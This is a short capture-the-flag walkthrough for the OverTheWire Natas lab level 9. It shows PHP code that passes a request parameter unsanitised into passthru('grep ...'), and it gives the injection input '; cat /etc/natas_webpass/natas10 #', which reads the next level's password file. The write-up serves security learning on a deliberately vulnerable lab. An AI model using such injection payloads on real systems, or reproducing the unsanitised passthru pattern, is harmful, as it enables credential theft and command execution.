## Level 10

**URL**: [Level 9](http://natas9.natas.labs.overthewire.org/)

 1. [View sourcecode](http://natas9.natas.labs.overthewire.org/index-source.html)
	 ``` php
	   $key = "";  
		if(array_key_exists("needle", $_REQUEST)) {  
			$key = $_REQUEST["needle"];  
		}  
		if($key != "") {  
			passthru("grep -i $key dictionary.txt");  
		}
	```
2. According to the following line, we can execute commands in web server:
	 ``` 
	 passthru("grep -i $key dictionary.txt");
	 ```
	 	 
 3. **All passwords are stored in /etc/natas_webpass/**. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.
4. Execute the following command:
	```
	; cat /etc/natas_webpass/natas10 #```